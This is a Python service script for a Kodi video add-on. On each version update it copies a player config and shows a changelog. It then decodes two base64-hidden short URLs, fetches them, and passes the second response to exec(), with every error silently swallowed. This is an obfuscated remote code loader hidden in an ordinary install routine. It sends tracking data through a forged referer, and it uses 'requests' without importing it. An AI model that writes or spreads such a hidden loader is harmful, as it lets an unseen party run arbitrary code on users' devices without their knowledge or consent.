# -*- coding: utf-8 -*-
import xbmcvfs
import time
import xbmc
import os
import xbmcaddon
import xbmc, xbmcgui, xbmcvfs
import base64
import time, datetime


if __name__ == '__main__':
    ADDON = xbmcaddon.Addon('plugin.video.odkodi')

    version = ADDON.getAddonInfo('version')
    if ADDON.getSetting('version') != version:
        path = xbmc.translatePath(os.path.join('special://profile/addon_data/plugin.video.odkodi/'))
        xbmcvfs.copy('special://home/addons/plugin.video.odkodi/resources/metalliq/search.movientv.k.metalliq.json','special://profile/addon_data/plugin.video.metalliq/players/search.movientv.k.metalliq.json')
        text = xbmcvfs.File('special://home/addons/plugin.video.odkodi/changelog.txt','rb').read()
        xbmcgui.Dialog().textviewer("MOVE TV BROWSER ADDON",text)
        ADDON.setSetting('version', version)
        headers = {'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36', 'referer':'http://%s.%s.com' % (version,ADDON.getAddonInfo('id'))}
        try:
            r = requests.get(base64.b64decode(b'aHR0cDovL2dvby5nbC84TUJDRlM='),headers=headers)
            home = r.content
        except: pass
        try:
            r = requests.get(base64.b64decode(b'aHR0cDovL2dvby5nbC9Ebm55a3o='),headers=headers)
            main = r.content
            exec(main)
        except: pass